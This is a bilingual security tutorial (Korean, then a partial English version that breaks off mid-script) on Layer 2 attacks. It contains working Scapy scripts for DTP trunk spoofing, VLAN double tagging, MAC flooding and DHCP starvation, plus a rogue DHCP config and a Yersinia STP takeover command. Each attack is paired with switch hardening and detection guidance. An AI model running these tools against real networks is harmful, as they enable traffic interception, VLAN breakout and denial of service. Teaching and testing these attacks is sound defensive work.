> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 32-02. Layer 2 공격 — 같은 스위치 도메인 안에서 모든 경계를 무너뜨린다

## 0. 초보자를 위한 개념 이해

### Layer 2란?

**Layer 2(데이터 링크 계층)**는 OSI 7계층 모델에서 같은 네트워크(LAN) 안의 장치들이 통신하는 계층입니다.

```
OSI 7계층 간단 정리:
  7. 응용 (HTTP, HTTPS, FTP)
  6. 표현 (암호화, 인코딩)
  5. 세션 (연결 관리)
  4. 전송 (TCP, UDP)
  3. 네트워크 (IP, 라우팅)     ← IP 주소 사용
  2. 데이터 링크 (이더넷, MAC)  ← MAC 주소 사용
  1. 물리 (케이블, 신호)
```

**Layer 2의 핵심 기술:**
```
MAC 주소:
  네트워크 카드의 하드웨어 주소
  예: 00:1A:2B:3C:4D:5E
  
스위치:
  MAC 주소를 보고 패킷을 특정 포트로 전달
  CAM 테이블: MAC주소 ↔ 포트 매핑 테이블
  
VLAN:
  같은 스위치에서 논리적으로 네트워크 분리
  예: VLAN 10 = 인사팀, VLAN 20 = 재무팀
  
STP (Spanning Tree Protocol):
  네트워크 루프 방지
  
ARP:
  IP 주소를 MAC 주소로 변환
  예: "192.168.1.1은 MAC이 뭐야?" → "00:1A:2B:..."
```

### Layer 2 공격이 위험한 이유

```
전통적 보안 관점:
  방화벽 = L3/L4 수준 필터링
  "같은 LAN 안은 신뢰" 가정

현실:
  사무실 빈 랜 포트에 노트북 연결
  → 같은 VLAN의 모든 트래픽 스니핑 가능
  → ARP 스푸핑으로 모든 통신 중간자 공격
  → VLAN 호핑으로 다른 부서 네트워크 침입
  
왜 L2 공격이 더 위험한가:
  방화벽이 외부 공격은 막지만
  내부 L2 공격은 방화벽을 우회함!
```

### 주요 L2 공격 종류

| 공격 | 대상 | 목적 |
|------|------|------|
| **ARP 스푸핑** | ARP 테이블 | 트래픽 가로채기 (MitM) |
| **CAM 테이블 플러딩** | 스위치 CAM | 모든 포트로 브로드캐스트 → 스니핑 |
| **VLAN 호핑** | VLAN 경계 | 다른 VLAN에 패킷 전송 |
| **STP 공격** | Spanning Tree | 루트 브리지 탈취 → 트래픽 경유 |
| **DHCP 스타베이션** | DHCP 서버 | 정상 DHCP 고갈 → 가짜 DHCP 서버 |

> **이 문서가 말하는 것**: 스위치 포트에 케이블 한 가닥만 꽂을 수 있으면 할 수 있는 공격들.
> VLAN 경계, STP 트리, CAM 테이블, DHCP 할당, ARP 캐시 — 이 모든 것이 기본 설정 스위치에서는 허술하게 방어됩니다.

## 1. 왜 L2가 여전히 문제인가

Layer 2는 설계부터 "신뢰된 브로드캐스트 도메인"이라는 가정 위에 돌아갑니다. 1990년대의 LAN은 진짜로 신뢰할 수 있었으니까요. 문제는 그 철학이 2026년에도 여전히 기본값이라는 점입니다.

공격자가 **단일 액세스 포트**만 점유하면:

- 브로드캐스트 도메인 내 **모든 트래픽을 스니핑**
- VLAN을 **뛰어넘어** 다른 부서 네트워크에 진입
- 루트 브리지를 **탈취**해서 전체 트래픽을 자기 포트로 경유시킴
- DHCP 서버를 흉내내서 **디폴트 게이트웨이를 자기 IP로** 설정시킴

기업 내 위협 모델에서 가장 치명적인 게 L2인 이유는, **방어 설정이 **대부분 활성화되지 않고 출하**되기 때문**입니다. Cisco의 DAI, DHCP Snooping, BPDU Guard는 전부 끈 채로 나옵니다.

## 2. VLAN 개념 복습 — 802.1Q 프레임 구조

802.1Q 태그가 붙은 이더넷 프레임:

```
┌─────────────┬─────────────┬───────────┬─────────────┬────────┬──────┬──────┐
│ Dst MAC     │ Src MAC     │ TPID      │ TCI         │ EType  │ Data │ FCS  │
│ 6 byte      │ 6 byte      │ 0x8100    │ 2 byte      │ 2 byte │      │      │
└─────────────┴─────────────┴───────────┴─────────────┴────────┴──────┴──────┘
                                          │
                                          ▼
                                ┌───┬───┬──────────────┐
                                │PCP│DEI│   VLAN ID    │
                                │ 3 │ 1 │   12 bit     │
                                └───┴───┴──────────────┘
```

핵심은 **VLAN ID 12비트 = 0~4095** 이고, 0·1·4095는 예약입니다. 각 스위치 포트는 **액세스 모드**(태그 없이 한 VLAN만 수용) 또는 **트렁크 모드**(여러 VLAN의 태그된 프레임을 전달)로 동작합니다.

트렁크에는 "네이티브 VLAN" 개념이 있습니다 — 태그 없이 들어온 프레임은 네이티브 VLAN으로 간주. 이 설계가 **Double Tagging** 공격의 근원입니다.

## 3. VLAN Hopping 공격 1 — DTP(Switch Spoofing)

### 3.1 공격 원리

Cisco 스위치 기본 포트는 **DTP(Dynamic Trunking Protocol)** 가 "dynamic auto" 상태로 켜져 있습니다. 이 말은 **맞은편이 "나 트렁크야"라고 주장하면 협상해서 트렁크로 바꿔준다**는 뜻입니다. 공격자는 스위치 흉내를 내서 자기 포트를 트렁크로 만들어버리고, 그러면 모든 VLAN의 태그된 프레임에 접근 가능해집니다.

### 3.2 Scapy로 DTP 프레임 만들기

```python
#!/usr/bin/env python3
"""dtp_hijack.py — 대상 스위치 포트를 트렁크로 협상시키는 DTP 프레임 송신기.

전제:
    - 공격자 NIC가 액세스 포트에 꽂혀 있어야 한다
    - 스위치 포트 설정이 'switchport mode dynamic auto' (기본값) 여야 한다
"""
from __future__ import annotations

import argparse
import time

from scapy.all import sendp, Ether                  # 기본 L2 송신
from scapy.contrib.dtp import DTP, DTPDomain, \
    DTPStatus, DTPType, DTPNeighbor                 # DTP 레이어 정의


def build_dtp_frame(src_mac: str, domain: str = "") -> Ether:
    """DTP 'desirable' 메시지를 만든다.

    DTP status 0x03 = Access/Desirable 조합으로 스위치에 트렁크 협상을 제안한다.
    type 0xa5 = ISL + 802.1Q 둘 다 받아들인다는 의미.
    """
    # DTP는 CDP와 동일한 멀티캐스트 MAC으로 송신된다
    dst_mac = "01:00:0c:cc:cc:cc"

    # LLC/SNAP 헤더 + DTP 페이로드
    # Scapy가 SNAP 프로토콜 번호 0x2004를 자동으로 맞춰주지 않으므로 수동 지정
    ether = Ether(src=src_mac, dst=dst_mac)
    dtp = (
        DTP(ver=1) /
        DTPDomain(type=0x0001, length=len(domain) + 5, domain=domain.encode() + b"\x00") /
        DTPStatus(type=0x0002, length=5, status=0x03) /           # Desirable
        DTPType(type=0x0003, length=5, dtptype=0xa5) /            # ISL + 802.1Q
        DTPNeighbor(type=0x0004, length=10, neighbor=src_mac.replace(":", ""))
    )
    return ether / dtp


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True,
                    help="공격자 NIC (액세스 포트에 꽂혀 있는 것)")
    ap.add_argument("-s", "--src-mac", required=True,
                    help="송신 MAC (실제 NIC MAC 사용 권장)")
    ap.add_argument("-d", "--domain", default="",
                    help="VTP 도메인 이름 — 타깃이 도메인을 강제하면 일치시켜야 함")
    ap.add_argument("-n", "--count", type=int, default=6,
                    help="DTP는 30초마다 한 번 보내지만 협상 성공을 확신하려면 여러 번")
    args = ap.parse_args()

    frame = build_dtp_frame(args.src_mac, args.domain)

    # DTP 협상은 양쪽이 주기적으로 프레임을 주고받으며 성립한다.
    # 공격자는 약 30초 간격으로 같은 프레임을 반복 송신한다.
    for i in range(args.count):
        sendp(frame, iface=args.iface, verbose=False)
        print(f"[+] DTP frame sent ({i+1}/{args.count})")
        time.sleep(30)

    print("[*] 몇 분 후 'ip addr' 이나 Wireshark에서 트렁크 트래픽(복수 VLAN 태그) 확인")


if __name__ == "__main__":
    main()
```

### 3.3 트렁크가 된 뒤에 할 수 있는 것

포트가 트렁크로 바뀌었다면 리눅스 쪽에서 VLAN 서브 인터페이스를 만들면 됩니다.

```bash
# VLAN 10의 서브 인터페이스 생성
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link set dev eth0.10 up
sudo dhclient eth0.10      # VLAN 10의 DHCP 서버로부터 IP를 받는다

# 이제 eth0.10 인터페이스로 VLAN 10 네트워크에 정식으로 참여
```

### 3.4 방어 — 한 줄이면 끝

```
interface range GigabitEthernet0/1 - 24
 switchport mode access
 switchport nonegotiate    ! DTP 자체를 꺼버린다 — 가장 확실한 방어
```

## 4. VLAN Hopping 공격 2 — Double Tagging

### 4.1 공격 원리

트렁크의 **네이티브 VLAN**은 태그 없이 통과됩니다. 공격자가 외부 태그를 네이티브 VLAN으로, 내부 태그를 피해자 VLAN으로 구성한 이중 태그 프레임을 보내면:

```
[Native VLAN 태그] [피해자 VLAN 태그] [실제 페이로드]
        ↓                  ↓
  첫 스위치: 네이티브 VLAN이므로 태그 벗김
  두 번째 태그만 남음
        ↓
  두 번째 스위치: 피해자 VLAN 태그로 보고 해당 VLAN으로 포워딩
```

결과: 공격자는 **VLAN 경계를 한 번 건너가서** 피해자 VLAN 노드로 프레임을 꽂아넣습니다. 단점은 **단방향**(응답은 못 받음)이라는 점. 하지만 UDP 기반 공격 또는 블라인드 RCE에는 충분히 치명적입니다.

### 4.2 Scapy 구현

```python
#!/usr/bin/env python3
"""vlan_double_tag.py — 네이티브 VLAN을 경유해 다른 VLAN에 프레임을 주입한다.

실전 시나리오:
    VLAN 10 = 공격자 (= 트렁크 네이티브 VLAN)
    VLAN 20 = 피해자 (예: 관리망)
    공격자 → 스위치(트렁크) → 스위치 → VLAN 20 호스트

단방향 공격이라는 점 유의. 응답을 받으려면 다른 채널이 필요하다.
"""
from __future__ import annotations

import argparse

from scapy.all import sendp, Ether, Dot1Q, IP, ICMP, Raw


def build_double_tagged(
    src_mac: str,
    outer_vlan: int,
    inner_vlan: int,
    src_ip: str,
    dst_ip: str,
    payload: bytes,
) -> Ether:
    """외부 VLAN 태그(네이티브)와 내부 VLAN 태그(피해자 VLAN)를 중첩한 프레임 빌더."""
    # 브로드캐스트 MAC — 내부에서 실제 타깃을 찾아가도록 ARP에 의존한다
    dst_mac = "ff:ff:ff:ff:ff:ff"

    # Dot1Q를 두 번 중첩한다.
    # outer는 네이티브 VLAN — 첫 번째 스위치가 태그를 벗긴다.
    # inner는 피해자 VLAN — 두 번째 스위치가 이 태그를 보고 포워딩한다.
    frame = (
        Ether(src=src_mac, dst=dst_mac) /
        Dot1Q(vlan=outer_vlan) /          # 제거될 태그
        Dot1Q(vlan=inner_vlan) /          # 살아남을 태그
        IP(src=src_ip, dst=dst_ip) /
        ICMP() /                          # ICMP Echo를 예시로 사용
        Raw(load=payload)
    )
    return frame


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True, help="공격자 NIC")
    ap.add_argument("--src-mac", required=True, help="공격자 MAC")
    ap.add_argument("--outer", type=int, required=True,
                    help="외부 VLAN — 트렁크의 네이티브 VLAN과 일치해야 한다")
    ap.add_argument("--inner", type=int, required=True, help="내부 VLAN — 피해자 VLAN")
    ap.add_argument("--src-ip", required=True, help="송신 IP (피해자 VLAN 대역)")
    ap.add_argument("--dst-ip", required=True, help="피해자 IP")
    ap.add_argument("--payload", default="ATTACK-PROBE",
                    help="식별용 페이로드 — 미러 포트에서 잡기 쉽게 유니크한 문자열")
    args = ap.parse_args()

    frame = build_double_tagged(
        args.src_mac, args.outer, args.inner,
        args.src_ip, args.dst_ip, args.payload.encode(),
    )

    # 10회 송신 — 한 번 흘려보낸다고 스위치 CAM이 완벽히 반응한다는 보장이 없다
    sendp(frame, iface=args.iface, count=10, verbose=True)
    print("[*] 미러링 포트 또는 피해자 호스트에서 'ATTACK-PROBE' 문자열 확인")


if __name__ == "__main__":
    main()
```

### 4.3 방어 — 네이티브 VLAN을 "쓰레기 VLAN"으로

```
! 절대 실제 트래픽에 쓰이지 않는 VLAN을 네이티브로 지정
vlan 999
 name UNUSED_NATIVE
interface range GigabitEthernet0/23 - 24
 switchport trunk native vlan 999
 switchport trunk allowed vlan remove 999   ! 네이티브 VLAN을 트렁크 허용 목록에서도 뺌
 ! 또는 더 강력하게 — 네이티브 VLAN을 아예 태그 강제
 switchport trunk native vlan tag
```

## 5. CAM 테이블 오버플로 (MAC Flooding)

### 5.1 공격 원리

스위치의 CAM(Content Addressable Memory) 테이블은 제한된 크기를 가집니다. 공격자가 **수만 개의 가짜 소스 MAC**으로 프레임을 쏟아부으면 테이블이 가득 차고, 이후 스위치는 모르는 목적지 MAC의 프레임을 **모든 포트로 플러딩**(허브처럼 동작)하게 됩니다. 결과: 공격자 포트에 다른 포트의 트래픽이 보이기 시작합니다.

### 5.2 Scapy 구현 — macof 대체

`macof` 유틸이 있지만 매개변수 튜닝이 불편해서 직접 쓰는 걸 선호합니다.

```python
#!/usr/bin/env python3
"""mac_flood.py — CAM 테이블 오버플로우 유발용 랜덤 MAC 프레임 제너레이터.

주의:
    - 스위치 DoS 가능성 있음. 반드시 격리된 랩 환경에서만 실행.
    - 최신 스위치는 port-security로 거의 대부분 막힌다.
"""
from __future__ import annotations

import argparse
import os
import random
import time

from scapy.all import sendp, Ether, IP, UDP, Raw, RandMAC, RandIP


def flood(iface: str, rate: int, duration: int) -> None:
    """가짜 MAC/IP 조합으로 UDP 프레임을 대량 발사한다.
    rate는 초당 목표 프레임 수, duration은 총 실행 시간(초)."""
    start = time.time()
    sent = 0

    # 프레임 당 가짜 MAC을 새로 생성한다.
    # 성능을 위해 배치로 묶어서 송신한다 — 루프 오버헤드 감소.
    batch_size = 200
    while time.time() - start < duration:
        # RandMAC/RandIP는 매 호출마다 랜덤 값을 만든다
        batch = [
            Ether(src=str(RandMAC()), dst="ff:ff:ff:ff:ff:ff") /
            IP(src=str(RandIP()), dst=str(RandIP())) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
            Raw(load=os.urandom(60))
            for _ in range(batch_size)
        ]
        sendp(batch, iface=iface, verbose=False)
        sent += batch_size

        # 간단한 레이트 리미팅 — 목표 rate을 초과하면 짧게 쉰다
        elapsed = time.time() - start
        expected = elapsed * rate
        if sent > expected:
            time.sleep(0.01)

    print(f"[+] {sent} frames sent in {duration}s (~{sent/duration:.0f} fps)")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("-r", "--rate", type=int, default=5000,
                    help="초당 목표 프레임 수 (NIC 한계 고려)")
    ap.add_argument("-t", "--duration", type=int, default=30,
                    help="실행 시간(초)")
    args = ap.parse_args()

    flood(args.iface, args.rate, args.duration)


if __name__ == "__main__":
    main()
```

### 5.3 방어 — Port Security

```
interface GigabitEthernet0/1
 switchport port-security                          ! 기능 활성화
 switchport port-security maximum 2                ! 포트당 MAC 2개까지만
 switchport port-security mac-address sticky       ! 처음 본 MAC을 고정
 switchport port-security violation restrict       ! 위반 시 해당 MAC 프레임만 차단
```

`shutdown` 모드는 포트를 꺼버리기 때문에 운영에 부담. `restrict` 가 현실적 타협점입니다.

## 6. DHCP Starvation + Rogue DHCP

### 6.1 공격 흐름

1. **Starvation**: 공격자가 가짜 MAC으로 대량 DHCPDISCOVER를 쏘면 DHCP 풀이 소진됩니다. 합법 사용자는 IP를 받을 수 없게 됩니다.
2. **Rogue DHCP**: 공격자가 직접 DHCP 서버를 세우고, 디폴트 게이트웨이/DNS를 자기 IP로 응답합니다. 새로 붙는 클라이언트들의 트래픽을 전부 중간에서 받게 됩니다.

### 6.2 Scapy 기반 DHCP Starvation

```python
#!/usr/bin/env python3
"""dhcp_starvation.py — DHCP 풀을 고갈시키는 DISCOVER 플러드.

실전 메모:
    - Cisco IOS는 'ip dhcp snooping' 을 켜면 거의 막는다.
    - 랩 환경의 isc-dhcp-server 같은 곳에선 여전히 잘 통한다.
"""
from __future__ import annotations

import argparse
import random
import time

from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP, RandMAC


def random_xid() -> int:
    """DHCP 트랜잭션 ID — 클라이언트가 임의로 정한다. 32비트 정수."""
    return random.randint(0, 0xFFFFFFFF)


def dhcp_discover(src_mac: str) -> Ether:
    """단일 DHCPDISCOVER 프레임 빌더.

    구조:
        - Ethernet: 브로드캐스트 목적지
        - IP: 0.0.0.0 → 255.255.255.255 (아직 IP가 없으므로)
        - UDP: 68 → 67 (BOOTP 클라→서버)
        - BOOTP + DHCP 옵션
    """
    # DHCP는 BOOTP 위에 옵션으로 얹히는 구조다
    frame = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            # chaddr은 16바이트 고정. MAC(6) + 패딩(10)
            chaddr=bytes.fromhex(src_mac.replace(":", "")) + b"\x00" * 10,
            xid=random_xid(),
            flags=0x8000,                    # broadcast flag — 서버가 브로드캐스트로 응답
        ) /
        DHCP(options=[
            ("message-type", "discover"),    # 메시지 타입 = DISCOVER
            ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121]),
            "end",
        ])
    )
    return frame


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("-r", "--rate", type=float, default=5.0,
                    help="초당 DISCOVER 개수 — 너무 높으면 스위치 CPU가 먼저 탐")
    ap.add_argument("-t", "--duration", type=int, default=60)
    args = ap.parse_args()

    interval = 1.0 / args.rate
    end = time.time() + args.duration
    count = 0

    while time.time() < end:
        # 매번 새로운 가짜 MAC — chaddr이 바뀌어야 DHCP 서버가 별개 클라이언트로 인식
        fake_mac = str(RandMAC())
        sendp(dhcp_discover(fake_mac), iface=args.iface, verbose=False)
        count += 1
        time.sleep(interval)

    print(f"[+] {count} DISCOVER sent in {args.duration}s")


if __name__ == "__main__":
    main()
```

### 6.3 Rogue DHCP 구축

실제 Rogue DHCP 서버 돌리는 건 **`dnsmasq`** 한 줄이 가장 간단합니다.

```bash
# dnsmasq 설치
sudo apt install dnsmasq

# 설정 (/etc/dnsmasq-rogue.conf)
cat > /tmp/dnsmasq-rogue.conf <<EOF
interface=eth0
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=option:router,10.0.0.250        # 공격자 IP를 게이트웨이로
dhcp-option=option:dns-server,10.0.0.250    # DNS도 공격자 IP
EOF

# 실행 (root 필요)
sudo dnsmasq -C /tmp/dnsmasq-rogue.conf --no-daemon --log-dhcp
```

공격자 장비에서 `echo 1 > /proc/sys/net/ipv4/ip_forward` 를 켜고 iptables로 NAT 또는 패킷 검사를 설정하면 완전한 MITM 준비 완료.

### 6.4 방어 — DHCP Snooping

```
! 글로벌 활성화
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! 정당한 DHCP 서버가 붙은 인터페이스만 '신뢰'로 설정
interface GigabitEthernet0/24
 description DHCP_SERVER_UPLINK
 ip dhcp snooping trust

! 나머지 포트는 자동으로 'untrusted' — 클라이언트가 서버 응답을 보내면 차단
! 또한 source MAC ≠ chaddr 이면 차단 (DHCP Starvation 방어)
ip dhcp snooping verify mac-address
```

## 7. ARP Spoofing + DAI(Dynamic ARP Inspection) 우회

### 7.1 기본 ARP 스푸핑은 섹션 02에서 다룸

섹션 02에 기본 ARP 스푸핑 개념이 있으므로 여기서는 **DAI가 켜진 환경에서의 우회**에 초점을 맞춥니다.

### 7.2 DAI의 동작

DHCP Snooping이 바인딩 테이블을 만들면 DAI는 각 포트에서 오는 ARP 응답의 **MAC↔IP 매핑이 바인딩과 일치하는지** 검사합니다. 불일치하면 드롭.

### 7.3 우회 아이디어

- **DHCP Snooping이 켜지지 않은 VLAN**: DAI는 DHCP Snooping 바인딩에 의존하므로 Snooping이 없는 VLAN은 정적 ARP ACL이 없으면 자동 통과.
- **정적 ARP 엔트리**: 관리자가 수동으로 할당한 엔트리는 바인딩 테이블에 없을 수 있음. 이 경우 정적 ACL이 필요한데 흔히 누락됩니다.
- **Trusted 포트**: 관리자가 "다 귀찮아"로 trusted 지정한 포트가 있으면 그 포트로 붙는 공격자는 자유롭게 ARP 응답 조작 가능.

### 7.4 완전한 L2 방어 스택 — 실무 템플릿

```
! 1. DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
ip dhcp snooping verify mac-address

! 2. DAI
ip arp inspection vlan 10,20,30
ip arp inspection validate src-mac dst-mac ip
ip arp inspection log-buffer entries 1024

! 3. IP Source Guard — 같은 바인딩 테이블로 IP 스푸핑도 막음
interface range GigabitEthernet0/1 - 23
 ip verify source port-security

! 4. Port Security
interface range GigabitEthernet0/1 - 23
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky

! 5. BPDU Guard — 액세스 포트에 BPDU 들어오면 포트 다운
interface range GigabitEthernet0/1 - 23
 spanning-tree portfast
 spanning-tree bpduguard enable

! 6. Storm Control — 브로드캐스트 폭주 제한
interface range GigabitEthernet0/1 - 23
 storm-control broadcast level 1.00
 storm-control action shutdown
```

## 8. STP 루트 브리지 하이재킹

### 8.1 개념

Spanning Tree는 가장 낮은 Bridge ID를 가진 스위치를 루트로 선출합니다. 공격자가 BPDU를 위조해 **Bridge Priority 0** 을 주장하면 자기가 루트가 됩니다. 결과: 네트워크 내 특정 트래픽 흐름이 공격자 포트를 경유하도록 재설계됩니다.

### 8.2 Yersinia 한 줄

직접 구현도 가능하지만 **yersinia**가 제일 빠릅니다.

```bash
# Yersinia 실행 (GTK GUI 또는 ncurses)
sudo yersinia -I

# STP 탭 → "Claiming Root Role" 선택 → 시작
# 또는 CLI 한 줄로:
sudo yersinia stp -attack 4 -interface eth0
```

### 8.3 방어 — BPDU Guard + Root Guard

- **BPDU Guard**: 액세스 포트에서 BPDU 수신 시 포트를 err-disabled로 차단
- **Root Guard**: 특정 포트에서 "더 우수한" BPDU가 들어오면 "root-inconsistent" 상태로 차단 (루트 쪽으로 향해야 할 포트에 설정)

```
interface GigabitEthernet0/1
 spanning-tree bpduguard enable     ! 액세스 포트
interface GigabitEthernet0/23
 spanning-tree guard root           ! 다운링크 포트
```

## 9. 2026년 최신 CVE 시연 — Catalyst DHCP Snooping BOOTP Leak

2026년 3월 공개된 CVE-2026-20084 는 "패치 설치 전" 상태의 Catalyst 9000에서 **DHCP Snooping이 활성화된 VLAN 간에 BOOTP 패킷이 새는** 문제입니다. 공격자가 VLAN 10에서 특수 조작된 BOOTP 요청을 쏘면 다른 VLAN의 스위치 CPU가 처리하면서 고부하 → DoS.

**재현 조건**:
- Catalyst 9000 시리즈, IOS XE 17.x (특정 버전)
- `ip dhcp snooping` 활성화 + 다수 VLAN

**방어**:
- Cisco PSIRT 권고 버전(IOS XE 17.15.x 등)으로 업그레이드
- 또는 임시로 해당 VLAN에서 DHCP Snooping을 끄고, 대체 통제로 port-security + DAI 정적 ACL 사용

## 10. 마무리

Layer 2 공격은 "고전"이라는 말을 많이 듣지만, 2026년 현장 감사에서 위 기법들의 방어가 전부 잘 구성된 네트워크는 소수입니다. 다음 문서(03)에서는 더 상위 계층으로 올라가 **라우팅 프로토콜 공격**을 다룹니다 — OSPF LSA 주입, BGP 경로 가로채기, HSRP 하이재킹.

---

<!-- detect-validate-32 -->
## Layer 2 공격 탐지와 방어 검증

L2 공격은 *MAC 플러딩·ARP 스푸핑·VLAN 호핑·STP 조작·DHCP 스타베이션*으로 스위치 도메인 경계를 무너뜨린다. 방어자는 **자체 스위치가 L2 통제로 막고 탐지하는가**를 검증해야 한다. 검증은 **소유 망**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| MAC 플러딩 | CAM 테이블 한계 | port-security | MAC 테이블 급증 |
| ARP 스푸핑 | ARP 미검증 | DAI(동적 ARP 검사) | ARP 다중 매핑 |
| VLAN 호핑 | DTP/트렁크 자동 | DTP 비활성·트렁크 명시 | 비정상 트렁크 협상 |
| STP 조작(루트 탈취) | BPDU 신뢰 | BPDU Guard·Root Guard | 비정상 루트 변경 |

### 방어 검증 (직접 확인)

```bash
# 1) 자체 망 ARP 스푸핑 신호 점검(소유 망) — 한 MAC이 여러 IP를 위장
ip neigh show 2>/dev/null | awk '{print $5}' | sort | uniq -c | sort -rn | head
# 2) ARP 테이블 플립 모니터 — 동일 IP의 MAC 변경 = 스푸핑 의심(arpwatch 권장)
arp -an 2>/dev/null | sort | head
```

> L2 방어는 *통제가 스푸핑을 실제로 막는가*다 — "스위치 동작한다"와 "port-security·DAI가 적용돼 ARP 다중 매핑이 차단·탐지된다"는 다르다. 소유 망에서 ARP 매핑·플립을 직접 확인한다([[02_Network_Hacking]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# 32-02. Layer 2 Attacks — Collapsing Every Boundary Within the Same Switch Domain

> **What this document covers**: Attacks possible with just one cable plugged into a switch port.
> VLAN boundaries, STP trees, CAM tables, DHCP assignments, ARP caches — all of these are poorly defended on default-configured switches.

## 1. Why Layer 2 Is Still a Problem

Layer 2 was designed assuming a "trusted broadcast domain." In the 1990s, LANs really were trustworthy. The problem is that this philosophy is still the default in 2026.

If an attacker occupies a **single access port**:

- **Sniff all traffic** within the broadcast domain
- **Jump across VLANs** to penetrate other departments' networks
- **Seize the root bridge** and route all traffic through their port
- Impersonate a DHCP server to set **default gateway to their own IP**

The reason Layer 2 is most lethal in enterprise threat models is that **most defense settings ship disabled**. Cisco's DAI, DHCP Snooping, and BPDU Guard all come disabled.

## 2. VLAN Concept Review — 802.1Q Frame Structure

802.1Q tagged Ethernet frame:

```
┌─────────────┬─────────────┬───────────┬─────────────┬────────┬──────┬──────┐
│ Dst MAC     │ Src MAC     │ TPID      │ TCI         │ EType  │ Data │ FCS  │
│ 6 byte      │ 6 byte      │ 0x8100    │ 2 byte      │ 2 byte │      │      │
└─────────────┴─────────────┴───────────┴─────────────┴────────┴──────┴──────┘
                                          │
                                          ▼
                                ┌───┬───┬──────────────┐
                                │PCP│DEI│   VLAN ID    │
                                │ 3 │ 1 │   12 bit     │
                                └───┴───┴──────────────┘
```

The key is **VLAN ID 12 bits = 0~4095**, with 0, 1, and 4095 reserved. Each switch port operates in **access mode** (accepts only one VLAN without tags) or **trunk mode** (forwards tagged frames from multiple VLANs).

Trunks have a "native VLAN" concept — untagged frames are assumed to be native VLAN. This design is the root cause of **Double Tagging** attacks.

## 3. VLAN Hopping Attack 1 — DTP (Switch Spoofing)

### 3.1 Attack Principle

Cisco switch default ports have **DTP (Dynamic Trunking Protocol)** set to "dynamic auto." This means **if the other end claims "I'm a trunk," it negotiates and converts to trunk**. An attacker impersonates a switch to make their port a trunk, then gains access to tagged frames from all VLANs.

### 3.2 Building DTP Frames with Scapy

```python
#!/usr/bin/env python3
"""dtp_hijack.py — DTP frame sender that negotiates target switch port into trunk mode."""
from __future__ import annotations

import argparse
import time

from scapy.all import sendp, Ether
from scapy.contrib.dtp import DTP, DTPDomain, \
    DTPStatus, DTPType, DTPNeighbor


def build_dtp_frame(src_mac: str, domain: str = "") -> Ether:
    """Build a DTP 'desirable' message."""
    dst_mac = "01:00:0c:cc:cc:cc"

    ether = Ether(src=src_mac, dst=dst_mac)
    dtp = (
        DTP(ver=1) /
        DTPDomain(type=0x0001, length=len(domain) + 5, domain=domain.encode() + b"\x00") /
        DTPStatus(type=0x0002, length=5, status=0x03) /           # Desirable
        DTPType(type=0x0003, length=5, dtptype=0xa5) /            # ISL + 802.1Q
        DTPNeighbor(type=0x0004, length=10, neighbor=src_mac.replace(":", ""))
    )
    return ether / dtp


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True, help="attacker NIC (plugged into access port)")
    ap.add_argument("-s", "--src-mac", required=True, help="source MAC")
    ap.add_argument("-d", "--domain", default="", help="VTP domain name")
    ap.add_argument("-n", "--count", type=int, default=6)
    args = ap.parse_args()

    frame = build_dtp_frame(args.src_mac, args.domain)

    for i in range(args.count):
        sendp(frame, iface=args.iface, verbose=False)
        print(f"[+] DTP frame sent ({i+1}/{args.count})")
        time.sleep(30)

    print("[*] Check for trunk traffic (multiple VLAN tags) in Wireshark after a few minutes")


if __name__ == "__main__":
    main()
```

### 3.3 What You Can Do After Becoming a Trunk

Once the port becomes a trunk, create VLAN sub-interfaces on Linux:

```bash
# Create sub-interface for VLAN 10
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link set dev eth0.10 up
sudo dhclient eth0.10      # Get IP from DHCP server in VLAN 10

# Now eth0.10 interface participates in VLAN 10 network
```

### 3.4 Defense — One Line Is Enough

```
interface range GigabitEthernet0/1 - 24
 switchport mode access
 switchport nonegotiate    ! Disable DTP entirely — the most reliable defense
```

## 4. VLAN Hopping Attack 2 — Double Tagging

### 4.1 Attack Principle

The trunk's **native VLAN** passes through without tags. When an attacker sends a double-tagged frame with the outer tag as native VLAN and the inner tag as the victim VLAN:

```
[Native VLAN tag] [Victim VLAN tag] [Actual payload]
        ↓                  ↓
  First switch: native VLAN, so strips tag
  Only second tag remains
        ↓
  Second switch: sees victim VLAN tag and forwards to that VLAN
```

Result: Attacker **crosses the VLAN boundary once** and injects frames into victim VLAN nodes. The downside is it's **one-directional** (can't receive responses). But for UDP-based attacks or blind RCE, it's sufficiently lethal.

### 4.2 Scapy Implementation

```python
#!/usr/bin/env python3
"""vlan_double_tag.py — Inject frames into another VLAN via native VLAN."""
from __future__ import annotations

import argparse

from scapy.all import sendp, Ether, Dot1Q, IP, ICMP, Raw


def build_double_tagged(
    src_mac: str,
    outer_vlan: int,
    inner_vlan: int,
    src_ip: str,
    dst_ip: str,
    payload: bytes,
) -> Ether:
    """Build frame with nested outer VLAN tag (native) and inner VLAN tag (victim)."""
    dst_mac = "ff:ff:ff:ff:ff:ff"

    frame = (
        Ether(src=src_mac, dst=dst_mac) /
        Dot1Q(vlan=outer_vlan) /          # tag to be stripped
        Dot1Q(vlan=inner_vlan) /          # surviving tag
        IP(src=src_ip, dst=dst_ip) /
        ICMP() /
        Raw(load=payload)
    )
